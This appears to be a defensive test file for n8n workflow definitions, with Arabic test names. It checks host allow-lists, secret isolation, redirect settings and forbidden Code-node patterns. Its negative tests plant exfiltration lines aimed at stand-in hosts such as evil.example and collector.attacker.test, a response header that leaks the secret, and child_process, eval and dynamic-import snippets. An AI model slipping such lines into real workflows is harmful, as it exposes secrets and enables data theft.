    ["حذف متغيّر", (t) => t.split("`NX_DEADMAN_URL`").join("x"), "متغيّر غير مذكور"],
    [
      "حذف تصريح عدم التشغيل",
      (t) => t.replace("لم تُشغَّل هذه المسارات على n8n حقيقي", "شغّلناها"),
      "بلا تصريح",
    ],
    ["حذف خطوة التراجع", (t) => t.split("SADEED_WEB_RESEARCH").join("X"), "بلا خطوة التراجع"],
  ];
  for (const [label, plant, expected] of plants) {
    it("RED: " + label, () => {
      expect(checkReadme(plant(readme), ctx).join("|")).toContain(expected);
    });
  }
});

// ---------------------------------------------------------------------------
describe("⑧ شكل ناتج HTTP وعزل الأسرار والمضيفون وترتيب الفروع والنصوص الظاهرة", () => {
  const real = (name: string) => workflowByName(name);
  const httpNodes = (wf: any) => wf.nodes.filter((n: any) => typeName(n) === "httpRequest");

  // ---- ناتج HTTP كما يسلّمه n8n الحقيقي ----
  it("كل عقدة HTTP: ردّ نصّي كامل ومتنه في الحقل data بالاسم الصريح", () => {
    let count = 0;
    for (const name of NAMES) {
      for (const n of httpNodes(real(name))) {
        count += 1;
        expect(n.parameters.options.response.response).toEqual({
          fullResponse: true,
          neverError: true,
          outputPropertyName: "data",
          responseFormat: "text",
        });
      }
    }
    expect(count).toBeGreaterThanOrEqual(19);
  });
  const shapePlants: [string, (wf: any) => void, string][] = [
    [
      "outputPropertyName يصير body (الشكل الذي كان يخترعه المحرّك)",
      (wf) => {
        node(wf, "HTTP Brave").parameters.options.response.response.outputPropertyName = "body";
      },
      "outputPropertyName ليس صريحًا data",
    ],
    [
      "حذف outputPropertyName (الاعتماد على الافتراضي)",
      (wf) => {
        delete node(wf, "HTTP Brave").parameters.options.response.response.outputPropertyName;
      },
      "outputPropertyName ليس صريحًا data",
    ],
    [
      "responseFormat json (المتن محلَّل في body)",
      (wf) => {
        node(wf, "HTTP Brave").parameters.options.response.response.responseFormat = "json";
      },
      "responseFormat ليس text",
    ],
    [
      "responseFormat autodetect",
      (wf) => {
        delete node(wf, "HTTP Brave").parameters.options.response.response.responseFormat;
      },
      "responseFormat ليس text",
    ],
  ];
  for (const [label, plant, expected] of shapePlants) {
    it("RED: " + label, () => {
      const wf = real("sadeed-web-research");
      plant(wf);
      expect(checkHttpNodes(wf, DYNAMIC_TIMEOUT).join("|")).toContain(expected);
    });
  }

  // ---- jsonQuery / jsonHeaders نصّ JSON دائمًا ----
  it("حقول jsonQuery وjsonHeaders كلها ={{ JSON.stringify(...) }} (عقدة HTTP تستدعي JSON.parse)", () => {
    let count = 0;
    for (const name of NAMES) {
      for (const n of httpNodes(real(name))) {
        for (const field of ["jsonQuery", "jsonHeaders"]) {
          if (n.parameters[field] === undefined) continue;
          count += 1;
          expect(n.parameters[field]).toMatch(/^=\{\{ JSON\.stringify\(\$json(\.\w+)+\) \}\}$/);
        }
      }
    }
    expect(count).toBeGreaterThanOrEqual(8);
  });
  const jsonPlants: [string, string, string, string][] = [
    ["sadeed-web-research", "HTTP Google", "jsonQuery", "={{ $json.req.query }}"],
    ["sadeed-web-research", "HTTP Brave", "jsonHeaders", "={{ $json.req.headers }}"],
    ["fnn-dev-research", "HTTP GitHub", "jsonQuery", "={{ $json.req.query }}"],
    ["fnn-automation-runner", "HTTP Digest", "jsonHeaders", "={{ $json.req.headers }}"],
    ["fnn-automation-runner", "HTTP Scan", "jsonHeaders", "={{ $json.req.headers }}"],
    ["sadeed-web-research", "HTTP Google", "jsonQuery", "{not json"],
    ["sadeed-web-research", "HTTP Google", "jsonQuery", "={{ String($json.req.query) }}"],
  ];
  for (const [name, nodeName, field, value] of jsonPlants) {
    it("RED: " + nodeName + " " + field + " = " + value, () => {
      const wf = real(name);
      node(wf, nodeName).parameters[field] = value;
      expect(
        checkHttpNodes(wf, name === "fnn-automation-runner" ? 0 : DYNAMIC_TIMEOUT).join("|"),
      ).toContain(field);
    });
  }
  it("RED: حقل jsonQuery كائن لا نصّ", () => {
    const wf = real("sadeed-web-research");
    node(wf, "HTTP Google").parameters.jsonQuery = { q: "x" };
    expect(checkHttpNodes(wf, DYNAMIC_TIMEOUT).join("|")).toContain("ليس نصًّا");
  });

  // ---- لا تتبّع تحويلات مع اعتماد ----
  it("كل عقدة بها اعتماد لا تتبع التحويلات", () => {
    let credentialed = 0;
    for (const name of NAMES) {
      for (const n of httpNodes(real(name))) {
        if (!n.credentials) continue;
        credentialed += 1;
        expect(n.parameters.options.redirect).toEqual({ redirect: { followRedirects: false } });
      }
    }
    expect(credentialed).toBeGreaterThanOrEqual(4);
  });
  it("RED: عقدة بها اعتماد تتبع التحويلات (غياب الخيار أو تفعيله)", () => {
    const a = real("sadeed-web-research");
    delete node(a, "HTTP Brave").parameters.options.redirect;
    expect(checkHttpNodes(a, DYNAMIC_TIMEOUT).join("|")).toContain("تتبع التحويلات");
    const b = real("sadeed-web-research");
    node(b, "HTTP Brave").parameters.options.redirect = {
      redirect: { followRedirects: true, maxRedirects: 50 },
    };
    expect(checkHttpNodes(b, DYNAMIC_TIMEOUT).join("|")).toContain("تتبع التحويلات");
  });

  // ---- مضيفون مثبَّتون حرفيًّا (لا اشتقاق من الوحدة المفحوصة) ----
  it("القائمة المثبَّتة اثنا عشر مضيفًا، و ALLOWED_HOSTS تطابقها تمامًا", () => {
    expect(PINNED_HTTP_HOSTS.length).toBe(12);
    expect(checkAllowedHostsPinned(loadCode("plan-queries").ALLOWED_HOSTS)).toEqual([]);
    expect(loadCode("plan-queries").ALLOWED_HOSTS.slice().sort()).toEqual(
      PINNED_HTTP_HOSTS.slice().sort(),
    );
  });
  it("RED: إضافة مضيف إلى ALLOWED_HOSTS في الوحدة تُلتقط (الاشتقاق الدائري سابقًا)", () => {
    const mutated = loadCode("plan-queries", {
      from: '"api.osv.dev",',
      to: '"api.osv.dev",\n  "collector.attacker.test",',
    });
    expect(checkAllowedHostsPinned(mutated.ALLOWED_HOSTS).join("|")).toContain(
      "collector.attacker.test",
    );
  });
  it("RED: حذف مضيف من ALLOWED_HOSTS أو تكراره يُلتقط", () => {
    const missing = loadCode("plan-queries", { from: '  "api.osv.dev",\n', to: "" });
    expect(checkAllowedHostsPinned(missing.ALLOWED_HOSTS).join("|")).toContain("api.osv.dev");
    const dup = loadCode("plan-queries", {
      from: '"api.osv.dev",',
      to: '"api.osv.dev",\n  "api.osv.dev",',
    });
    expect(checkAllowedHostsPinned(dup.ALLOWED_HOSTS).join("|")).toContain("تكرار");
  });
  it("RED: عقدة HTTP تتجه إلى مضيف غريب تُلتقط حتى لو أُضيف المضيف إلى الوحدة", () => {
    const wf = real("fnn-dev-research");
    node(wf, "HTTP OSV").parameters.url = "https://collector.attacker.test/v1/query";
    expect(checkHttpHosts(wf).join("|")).toContain("خارج القائمة المعتمدة");
    expect(checkWorkflow(wf, JSON.stringify(wf)).join("|")).toContain("collector.attacker.test");
  });

  // ---- العناوين الديناميكية بالتطابق التام ----
  const urlPlants: [string, string, string][] = [
    ["sadeed-web-research", "HTTP Keyless", "={{ $json.body.target }}"],
    ["sadeed-web-research", "HTTP Keyless", "={{ $json.body.brief.terms }}"],
    ["sadeed-web-research", "HTTP Keyless", "={{ $json.url }}.evil.example"],
    ["sadeed-web-research", "HTTP Keyless", "={{ $json.url }}/x"],
    ["fnn-automation-runner", "HTTP Digest", "={{ $json.params.url }}"],
    ["fnn-automation-runner", "HTTP Scan", "={{ $json.req.url }}@evil.example"],
    ["fnn-automation-runner", "Canary App Health", "={{ $env.SADEED_APP_URL }}.evil.example/x"],
    ["fnn-automation-runner", "Canary App Health", "={{ $env.SADEED_APP_URL }}@evil.example/x"],
    ["fnn-automation-runner", "Canary App Health", "={{ $env.SADEED_APP_URL }}/api/other"],
    ["watchdog-canary", "App Health", "={{ $env.NX_DEADMAN_URL }}/api/public/health"],
    ["watchdog-canary", "Dead-man Ping", "={{ $json.deadmanUrl }}.evil.example"],
    ["watchdog-canary", "Dead-man Ping", "={{ $json.message }}"],
  ];
  for (const [name, nodeName, url] of urlPlants) {
    it("RED: " + nodeName + " عنوان " + url, () => {
      const wf = real(name);
      node(wf, nodeName).parameters.url = url;
      expect(checkHttpHosts(wf).join("|")).toContain("غير معتمد");
    });
  }
  it("العناوين الديناميكية الحقيقية كلها من الجدول المعتمد وعددها غير صفري", () => {
    let dynamic = 0;
    for (const name of NAMES) {
      const wf = real(name);
      for (const n of httpNodes(wf)) if (String(n.parameters.url).startsWith("=")) dynamic += 1;
      expect(checkHttpHosts(wf)).toEqual([]);
    }
    expect(dynamic).toBeGreaterThanOrEqual(8);
  });

  // ---- الأسرار لا تخرج من Verify/Sign ----
  it("البيئة المقروءة في كل عقدة Code وتعبير ضمن الجدول المعتمد، والسرّ في Verify وSign وحدهما", () => {
    let secretReaders = 0;
    for (const name of NAMES) {
      const wf = real(name);
      expect(checkEnvAccess(wf)).toEqual([]);
      for (const n of wf.nodes) {
        if (typeName(n) === "code" && /\$env\.(SADEED|FINN)_N8N_SECRET/.test(n.parameters.jsCode)) {
          secretReaders += 1;
          expect(["Verify", "Sign"]).toContain(n.name);
        }
      }
    }
    expect(secretReaders).toBe(6);
  });
  const envPlants: [string, (wf: any) => void, string][] = [
    [
      "ترويسة ردّ تحمل السرّ",
      (wf) => {
        node(wf, "Respond").parameters.options.responseHeaders.entries.push({
          name: "X-Debug-Key",
          value: "={{ $env.SADEED_N8N_SECRET }}",
        });
      },
      "متغيّر بيئة غير مسموح في تعبير",
    ],
    [
      "سرّ في تعبير عقدة Set",
      (wf) => {
        node(wf, "Stamp Google").parameters.assignments.assignments.push({
          id: "x",
          name: "leak",
          type: "string",
          value: "={{ $env.SADEED_N8N_SECRET }}",
        });
      },
      "متغيّر بيئة غير مسموح في تعبير",
    ],
    [
      "عقدة Code غير Verify/Sign تقرأ السرّ",
      (wf) => {
        node(wf, "Rank").parameters.jsCode += "\nconst s = $env.SADEED_N8N_SECRET;";
      },
      "متغيّر بيئة غير مسموح في عقدة Code «Rank»",
    ],
    [
      "عقدة Plan تقرأ متغيّرًا غير NX_GOOGLE_CX",
      (wf) => {
        node(wf, "Plan").parameters.jsCode += "\nconst s = $env.NX_ALERT_CHAT_ID;";
      },
      "متغيّر بيئة غير مسموح في عقدة Code «Plan»",
    ],
    [
      "وصول بأقواس $env['X']",
      (wf) => {
        node(wf, "Sign").parameters.jsCode += "\nconst s = $env['SADEED_N8N_SECRET'];";
      },
      "وصول غير قياسي إلى $env",
    ],
    [
      "تمرير $env كله",
      (wf) => {
        node(wf, "Plan").parameters.jsCode += "\nconst all = Object.assign({}, $env);";
      },
      "وصول غير قياسي إلى $env",
    ],
  ];
  for (const [label, plant, expected] of envPlants) {
    it("RED: " + label, () => {
      const wf = real("sadeed-web-research");
      plant(wf);
      expect(checkEnvAccess(wf).join("|")).toContain(expected);
      expect(checkWorkflow(wf, JSON.stringify(wf)).join("|")).toContain(expected);
    });
  }

  // ---- لا خروج شبكي ولا تنفيذ ديناميكي من عقد Code ----
  it("لا نمط ممنوع في أي عقدة Code حقيقية، وrequire للوحدة crypto وحدها", () => {
    let codeNodes = 0;
    let requires = 0;
    for (const name of NAMES) {
      const wf = real(name);
      expect(checkCodeNodes(wf)).toEqual([]);
      for (const n of wf.nodes) {
        if (typeName(n) !== "code") continue;
        codeNodes += 1;
        for (const m of n.parameters.jsCode.matchAll(/\brequire\s*\(([^)]*)\)/g)) {
          requires += 1;
          expect(m[1]).toBe('"crypto"');
        }
      }
    }
    expect(codeNodes).toBeGreaterThan(40);
    expect(requires).toBeGreaterThanOrEqual(4);
  });
  const codePlants: [string, string, string][] = [
    ["fetch يسرّب السرّ", "await fetch('https://evil.example/?s=' + 1);", "fetch"],
    [
      "this.helpers.httpRequest",
      "await this.helpers.httpRequest({ url: 'https://evil.example/' });",
      "helpers",
    ],
    ["$helpers.httpRequest", "await $helpers.httpRequest({ url: $json.body.u });", "helpers"],
    ["httpRequest وحده", "const f = httpRequest;", "httpRequest"],
    ["require child_process", "const cp = require('child_process');", "require غير crypto"],
    ["require fs", "const fs = require('fs');", "require غير crypto"],
    ["require ديناميكي", "const m = require(name);", "require غير crypto"],
    ["eval", "eval($json.body.code);", "تنفيذ ديناميكي"],
    ["new Function", "new Function($json.body.code)();", "تنفيذ ديناميكي"],
    [
      "AsyncFunction",
      "const F = Object.getPrototypeOf(async () => {}).constructor; F('x');",
      "تنفيذ ديناميكي",
    ],
    ["constructor.constructor", "[].constructor.constructor('return 1')();", "تنفيذ ديناميكي"],
    ["getPrototypeOf", "const P = Object.getPrototypeOf(async () => {});", "تنفيذ ديناميكي"],
    ["__proto__", "const P = ({}).__proto__;", "تنفيذ ديناميكي"],
    ["Reflect", "Reflect.ownKeys({});", "تنفيذ ديناميكي"],
    ["this بالأقواس يخفي helpers", "await this['hel' + 'pers']['http' + 'Request']({});", "this"],
    ["import ديناميكي", "const m = await import('node:fs');", "import"],
    ["process.env", "const k = process.env.X;", "نظام/عمليات"],
    ["globalThis", "globalThis.x = 1;", "نظام/عمليات"],
    ["XMLHttpRequest", "new XMLHttpRequest();", "واجهة شبكة"],
  ];
  for (const [label, snippet, expected] of codePlants) {
    it("RED: " + label, () => {
      const wf = real("sadeed-web-research");
      node(wf, "Split Keyless").parameters.jsCode += "\n" + snippet + "\n";
      const problems = checkCodeNodes(wf).join("|");
      expect(problems).toContain(expected);
      expect(checkWorkflow(wf, JSON.stringify(wf)).join("|")).toContain(expected);
    });
  }
  it("RED: لغة Code غير javaScript", () => {
    const wf = real("sadeed-web-research");
    node(wf, "Plan").parameters.language = "python";
    expect(checkCodeNodes(wf).join("|")).toContain("ليست javaScript");
  });

  // ---- ما تصدره Respond ----
  it("Respond: متن من العقدة السابقة وثلاث ترويسات معروفة، والاحتياطي ثابت JSON", () => {
    for (const name of Object.keys(CONTRACT_PATHS)) {
      const wf = real(name);
      expect(checkRespondNodes(wf)).toEqual([]);
      expect(node(wf, "Respond").parameters.responseBody).toBe("={{ $json.body }}");
      expect(
        node(wf, "Respond").parameters.options.responseHeaders.entries.map((e: any) => e.name),
      ).toEqual(["Content-Type", "X-Nx-Resp-Ts", "X-Nx-Resp-Sig"]);
      expect(node(wf, "Respond Fallback").parameters.responseBody.startsWith("{")).toBe(true);
    }
  });
  const respondPlants: [string, (wf: any) => void, string][] = [
    [
      "ترويسة إضافية",
      (wf) => {
        node(wf, "Respond").parameters.options.responseHeaders.entries.push({
          name: "X-Debug",
          value: "x",
        });
      },
      "ترويسة ردّ غير معتمدة",
    ],
    [
      "قيمة ترويسة التوقيع من حقل آخر",
      (wf) => {
        node(wf, "Respond").parameters.options.responseHeaders.entries[2].value =
          "={{ $json.ctx.nonce }}";
      },
      "قيمة ترويسة",
    ],
    [
      "متن الردّ من حقل غير body",
      (wf) => {
        node(wf, "Respond").parameters.responseBody = "={{ $json.ctx }}";
      },
      "متن Respond",
    ],
    [
      "رمز ردّ 500",
      (wf) => {
        node(wf, "Respond").parameters.options.responseCode = 500;
      },
      "رمز Respond ليس 200",
    ],
    [
      "الاحتياطي نصّ ليس JSON",
      (wf) => {
        node(wf, "Respond Fallback").parameters.responseBody = "{oops";
      },
      "متن Respond",
    ],
  ];
  for (const [label, plant, expected] of respondPlants) {
    it("RED: " + label, () => {
      const wf = real("sadeed-web-research");
      plant(wf);
      expect(checkRespondNodes(wf).join("|")).toContain(expected);
    });
  }

  // ---- ترتيب الفروع بالإحداثيات (n8n v1) ----
  it("المزوّدون بمفتاح يسبقون الدفعة بلا مفتاح، والنبض يسبق التنبيه، والاتصالات مرتبة", () => {
    for (const name of NAMES) {
      const wf = real(name);
      expect(checkBranchOrder(wf)).toEqual([]);
      expect(checkKeyedBeforeKeyless(wf)).toEqual([]);
      expect(checkHeartbeatFirst(wf)).toEqual([]);
    }
    const order = (real("sadeed-web-research").connections["Plan ok?"].main[0] as any[]).map(
      (c) => c.node,
    );
    expect(order).toEqual(["Gate Google", "Gate Brave", "Gate Tavily", "Gate Keyless"]);
    const wd = real("watchdog-canary").connections["Evaluate"].main[0].map((c: any) => c.node);
    expect(wd).toEqual(["Dead-man Configured?", "Notify?"]);
  });
  it("RED: الدفعة بلا مفتاح تُنقل إلى أعلى المخطط فتسبق المزوّدين بمفتاح", () => {
    const wf = real("sadeed-web-research");
    node(wf, "Gate Keyless").position = [1680, -100];
    expect(checkKeyedBeforeKeyless(wf).join("|")).toContain("لا يسبق «Gate Keyless»");
    expect(checkBranchOrder(wf).join("|")).toContain("ترتيب الاتصالات");
    expect(checkWorkflow(wf, JSON.stringify(wf)).join("|")).toContain("لا يسبق «Gate Keyless»");
  });
  it("RED: ترتيب الاتصالات يخالف الإحداثيات", () => {
    const wf = real("sadeed-web-research");
    wf.connections["Plan ok?"].main[0].reverse();
    expect(checkBranchOrder(wf).join("|")).toContain("ترتيب الاتصالات");
  });
  it("RED: فرع التنبيه يسبق النبض في المراقب", () => {
    const wf = real("watchdog-canary");
    node(wf, "Notify?").position = [1200, -300];
    expect(checkHeartbeatFirst(wf).join("|")).toContain("النبض");
  });

  // ---- نصوص ظاهرة: بلا شرطة طويلة ولا اسم سابق في كل مصدر ----
  const visibleFiles = () => {
    const files = [
      join(ROOT, "n8n", "README.md"),
      join(ROOT, "scripts", "build-n8n-workflows.mjs"),
      join(ROOT, "scripts", "n8n-sign-example.mjs"),
    ];
    for (const f of readdirSync(join(ROOT, "n8n", "code"))) {
      if (f.endsWith(".js")) files.push(join(ROOT, "n8n", "code", f));
    }
    for (const f of readdirSync(WF_DIR)) files.push(join(WF_DIR, f));
    return files;
  };
  it("لا شرطة طويلة ولا اسم منتج سابق في أي ملف يُشحن (الوحدات، المولّد، السكربت، المسارات، README)", () => {
    const files = visibleFiles();
    expect(files.length).toBeGreaterThanOrEqual(17);
    for (const f of files) expect(checkVisibleText(f, readFileSync(f, "utf8"))).toEqual([]);
  });
  const textPlants: [string, string, string][] = [
    ["اسم منتج سابق في تنبيه (NEXIOS)", "تنبيه: حالة NEXIOS الآن", "اسم منتج سابق"],
    ["شرطة طويلة في تنبيه", "تنبيه — فشل مسار في n8n.", "شرطة طويلة"],
    ["اسم المساعد السابق بالعربية", "ملخص (فِن) تنبيه", "اسم منتج سابق"],
    ["اسم المساعد السابق باللاتينية", "FINN says hi", "اسم منتج سابق"],
    ["اسم قديم آخر", "Nexus alert", "اسم منتج سابق"],
  ];
  for (const [label, text, expected] of textPlants) {
    it("RED: " + label + " داخل شيفرة العقدة", () => {
      const wf = real("watchdog-canary");
      node(wf, "Evaluate").parameters.jsCode += '\nconst note = "' + text + '";\n';
      expect(checkVisibleText("x", text).join("|")).toContain(expected);
      expect(checkWorkflow(wf, JSON.stringify(wf)).join("|")).toContain(expected);
    });
  }
  it("اسم المتغيّر FINN_N8N_SECRET عقدٌ حيّ وليس اسمًا سابقًا معروضًا", () => {
    expect(checkVisibleText("x", "FINN_N8N_SECRET")).toEqual([]);
  });

  // ---- وقت التشغيل: الخروج الشبكي والسرّ في الردّ ----
  const call = (over: any = {}) => ({
    node: "HTTP Google",
    url: "https://www.googleapis.com/customsearch/v1?q=x",
    timeoutMs: 1100,
    credentials: [],
    followRedirects: true,
    ...over,
  });
  it("egressProblems: نداء سليم لا يحمر، وكل انتهاك يحمر", () => {
    expect(egressProblems([call()], [])).toEqual([]);
    expect(egressProblems([call({ url: "https://evil.example/x" })]).join("|")).toContain(
      "خارج القائمة",
    );
    expect(egressProblems([call({ url: "http://www.googleapis.com/x" })]).join("|")).toContain(
      "غير https",
    );
    expect(
      egressProblems([call({ url: "https://www.googleapis.com@evil.example/x" })]).join("|"),
    ).toContain("خارج القائمة");
    expect(
      egressProblems([call({ url: "https://user:pw@www.googleapis.com/x" })]).join("|"),
    ).toContain("معرّف مستخدم");
    expect(egressProblems([call({ timeoutMs: 300000 })]).join("|")).toContain("مهلة نداء");
    expect(egressProblems([call({ timeoutMs: 100 })]).join("|")).toContain("مهلة نداء");
    expect(
      egressProblems([call({ credentials: ["Nx Google Search Key"], followRedirects: true })]).join(
        "|",
      ),
    ).toContain("يتبع التحويلات");
    expect(
      egressProblems([call({ url: "https://app.example/api/public/health" })], ["app.example"]),
    ).toEqual([]);
  });
  it("secretLeakProblems: السرّ في الترويسة أو المتن يحمر، والنظيف لا", () => {
    const clean = { headers: { "x-nx-resp-sig": "v1=abc" }, body: "{}" };
    expect(secretLeakProblems(clean, ["SECRET-VALUE-12345678901234567890123"])).toEqual([]);
    expect(
      secretLeakProblems(
        { headers: { "x-debug": "SECRET-VALUE-12345678901234567890123" }, body: "{}" },
        ["SECRET-VALUE-12345678901234567890123"],
      ).length,
    ).toBe(1);
    expect(
      secretLeakProblems({ headers: {}, body: "echo SECRET-VALUE-12345678901234567890123" }, [
        "SECRET-VALUE-12345678901234567890123",
      ]).length,
    ).toBe(1);
    expect(secretLeakProblems(undefined, ["x"])).toEqual([]);
  });
});
